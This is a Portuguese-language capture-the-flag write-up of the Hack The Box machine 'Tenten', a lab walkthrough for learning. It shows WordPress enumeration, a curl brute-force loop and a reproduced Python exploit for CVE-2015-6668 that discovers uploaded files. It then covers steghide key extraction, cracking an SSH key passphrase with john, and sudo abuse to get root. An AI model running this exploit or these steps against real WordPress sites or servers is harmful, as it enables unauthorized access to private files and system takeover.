---
title: "Hack The Box - Tenten"
tags: [Linux,Medium,Wordpress,John,Brute Force]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/8>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 - Servidor SSH. Dificilmente a exploração vai ser por aqui

> Porta 80 - Servidor Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_web.png)

Bom por identificarmos que é `WordPress` devemos sempre rodar o `wpscan` pra ver se ele nos traz vulnerabilidades e/ou usuários

### Wpscan

Geralmente exploração de WordPress se da através de plugins que o administrador do sistema instala, então vamos verificar tudo que tem instalado neste servidor

> wpscan --url http://10.10.10.10

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wpscan.png)

Encontramos um plugin instalado, o `job-manager`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wpscan1.png)

Vamos enumerar usuários também

> wpscan --url http://10.10.10.10 -e u

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wpscan2.png)

Encontramos o usuário `takis`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wpscan3.png)

#### Plugin Job-Manager

Vamos perguntar sobre esse plugin pra quem sabe... Google

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_google.png)

> CVE-2015-6668

> https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-job-manager-security-bypass-0-7-25/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_google1.png)

Dentro desse site nos dá acesso a outro site, onde explica como explorar essa vulnerabilidade

> https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/

Resumindo: essa vulnerabilidade nos da permissão pra acessar arquivos que foram upados no servidor e que não deveriamos ter acesso, verificando pelo site nós encontramos o ponto onde podemos upar arquivos e imagens. É um brute force, iriamos ficar trocando de 8 pra 9 pra 10... e ie visualizando os arquivos upados

> http://10.10.10.10/index.php/jobs/apply/8/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wp.png)

# Explorando Job Manager Wordpress

Bom, vamos realizar a exploração do modo que está sendo explicado pelo tutorial

Realizamos o upload de uma imagem qualquer, pra testar se conseguimos visualizar ela no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wp3.png)

Verificamos no código fonte da página como está descrito algum campo pra podermos fazer o BruteForce na página, é em '<title>'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_wp4.png)

## Brute Force na aplicação

Bom, uma vez upado um arquivo, verificado como ele aparece no site, vamos realizar o brute force pra verificar outros arquivos que foram upados lá

```
for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_brute.png)

Opa, algo estranho. Achamos um arquivo chamado 'HackerAccessGranted'

Po, mas eu poderia fazer isso na mão... trocando os valores, sim, poderiamos, mas sei lá, vai que ocorra uma situação onde o arquivo que eu quero está em 250... ir indo uma um demora tempo pra caramba


### Download da imagem

Agora o blog nos dá duas opções para realização do download dessa imagem 'HackerAccessGranted', uma delas é através de uma requisição especifica no site. Outra é através de um script já pronto que só precisamos jogar qual imagem queremos baixar


#### Através wget

O blog específica como sendo essa a requisição

> /wp-content/uploads/%year%/%month%/%filename%

Então vamos descobrir qual é o ano e mês, sabemos que é a de número 13. Verificando na postagem do jobs listing temos uma dica

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_jobs.png)

> Start Date 2017-04-01

> End Date 2017-04-20

Bom, então colocamos como sendo ano 2017 e mês 04

> /wp-content/uploads/2017/04/HackerAccesGranted.jpg

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_job1.png)

#### Através do script

Pegamos o script do blog e fizemos algumas alterações

Antes:

```
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2016):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

Depois:

```
import requests

print """
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25
"""
website = raw_input('Enter a vulnerable website: ')
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2018):
    for i in range(3,13):
        for extension in {'jpg','jpeg','png'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

Alterações: Range de Years e Formats

Rodamos o script

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_exp.png)

Aqui está a imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_img.png)

### Extraindo chave SSH

Bom agora que temos a imagem podemos começar a trabalhar com ela, a primeira coisa a verificar é que ela não é uma imagem qualquer. Rodo o strings, binwalk e não consigo nada... vou conseguir somente com o `steghide`

> steghide extract -sf HackerAccessGranted.jpg

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_steg.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_steg1.png)

Uma chave SSH!

Só que temos um pequeno problema, ela está com senha, não conseguiremos fazer acesso sem antes quebrar essa senha dela

### Quebrando senha chave SSH

Usarei uma ferramenta chamada `ssh2john` para realizar a geração do hash dessa senha pra podermos quebrar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh1.png)

Baixamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh2.png)

Executamos no arquivo id_rsa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh3.png)

Agora com o `john` realizamos a quebra da senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh4.png)

> superpassword (id_rsa)

### Login SSH

Agora com a chave e a senha, realizamos o login na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_ssh5.png)

# Escalação de privilégio

Agora vamos iniciar a escalação de privilégio

Verificando com `sudo -l` as permissões que tenho na máquina para rodar comandos como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_sudo.png)

Opa, posso executar esse `/bin/fuckin` como root

Vamos verificar o que ele faz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_sudo1.png)

Bom, se passarmos outros comandos pra ele, ele vai executar, então passamos um bash e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_sudo2.png)

## Pegando flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tenten/T_user.png)